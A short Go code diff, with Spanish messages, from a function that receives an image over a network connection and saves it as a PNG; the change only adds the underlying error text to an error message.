@@ -107,7 +107,7 @@ func Comando(conexiones net.Conn) error {
 		fmt.Println(color.Violeta + "[*] esperando la imagen ..." + color.Reset)
 		byte_img, img_error := ss.Obtener_img(conexiones)
 		if img_error != nil {
-			return errors.New("[!] error al obtener la imagen")
+			return errors.New(fmt.Sprintf("[!] error al obtener la imagen:\n %s", img_error))
 		}
 		nombre := input.Input("[*] nombre del png (sin extension)>> ")
 		ss.Escribir_img(byte_img, nombre)
